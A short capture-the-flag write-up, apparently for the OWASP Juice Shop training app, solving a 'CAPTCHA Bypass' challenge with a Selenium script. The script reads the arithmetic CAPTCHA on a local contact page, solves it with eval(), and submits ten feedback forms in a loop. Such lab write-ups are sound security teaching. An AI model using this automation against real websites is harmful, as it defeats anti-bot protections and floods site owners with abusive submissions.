# CAPTCHA Bypass

**Difficulty**: :star2::star2::star2:

**Description**: Submit 10 or more customer feedbacks within 10 seconds.

**Category**: Broken Anti Automation

**Tags**: `Brute Force`

**Solution**:

Using Selenium:

Tested on:
- Python: 3.10.4
- [ChromeDriver 103.0.5060.134](https://chromedriver.storage.googleapis.com/index.html?path=103.0.5060.134/)
- selenium = "4.3.0"

```python
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait

driver = webdriver.Chrome("./chromedriver")
driver.get("http://localhost:3000/#/contact")

wait = WebDriverWait(driver, 10)

btn = wait.until(EC.element_to_be_clickable((By.XPATH, "//span[text()='Dismiss']")))
btn.click()

for i in range(10):
    comment = driver.find_element(By.ID, "comment")
    comment.send_keys("some text")

    rating = driver.find_element(By.ID, "rating")
    rating.click()

    captcha = driver.find_element(By.ID, "captcha")
    captchaResult = eval(captcha.text)

    captchaControl = driver.find_element(By.ID, "captchaControl")
    captchaControl.send_keys(captchaResult)

    submitButton = driver.find_element(By.ID, "submitButton")
    submitButton.click()
driver.close()
```

Result:

![filling form using selenium](https://user-images.githubusercontent.com/64480713/180011503-0f6698b4-e608-43a8-8690-7f218a2f0da5.png)
